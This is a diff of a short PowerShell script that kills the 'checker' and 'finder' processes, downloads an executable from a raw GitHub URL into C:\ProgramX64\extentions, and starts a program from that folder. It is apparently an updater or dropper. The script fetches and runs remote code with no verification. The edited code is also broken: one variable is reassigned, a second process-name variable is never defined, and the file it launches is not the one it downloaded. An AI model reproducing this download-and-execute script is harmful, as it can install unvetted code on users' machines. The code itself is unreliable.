@@ -1,13 +1,18 @@
 
 $directory    = "C:\ProgramX64\extentions"
 $processName  = "checker"
-$oldExePath   = Join-Path $directory "checker.exe"
-
-$downloadUrl  = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/script.exe"
+$processName  = "finder"
+$oldExePath   = Join-Path $directory "finder.exe"
+$oldExePath2   = Join-Path $directory "checker.exe"
+$downloadUrl  = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/waj.exe"
 
 try {
     if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
         Stop-Process -Name $processName -Force
+        Start-Sleep -Seconds 2
+    }
+    if (Get-Process -Name $processName2 -ErrorAction SilentlyContinue) {
+        Stop-Process -Name $processName2 -Force
         Start-Sleep -Seconds 2
     }
 
@@ -15,7 +20,7 @@ try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $oldExePath
 
     if (Test-Path -Path $oldExePath) {
-        Start-Process -FilePath $oldExePath
+        Start-Process -FilePath $oldExePath2
     }
 }
 catch {
